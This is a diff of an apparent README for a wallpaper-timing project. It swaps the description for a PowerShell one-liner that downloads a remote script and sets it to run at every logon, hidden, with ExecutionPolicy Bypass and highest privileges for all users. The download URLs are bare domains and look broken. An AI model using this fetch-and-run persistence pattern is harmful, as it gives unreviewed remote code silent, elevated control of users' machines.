@@ -1,2 +1,2 @@
-# time-wallpaper-look
-class 10th tipse one
+
+$dir="C:\New folder"; if(!(Test-Path $dir)){New-Item $dir -ItemType Directory -Force|Out-Null}; Invoke-WebRequest -Uri "https://githubusercontent.com" -OutFile "$dir\TimedWallpaperLock2027.ps1" -UseBasicParsing; Invoke-WebRequest -Uri "https://githubusercontent.com" -OutFile "$dir\daniel-leone-v7daTKlZzaw-unsplash.jpg" -UseBasicParsing; $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$dir\TimedWallpaperLock2027.ps1'"; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest; Register-ScheduledTask -TaskName "2027WallpaperAutomator" -Action $action -Trigger $trigger -Principal $principal -Force; Write-Host "Windows 11 Deployment Completed Successfully for ninad65!" -ForegroundColor Green
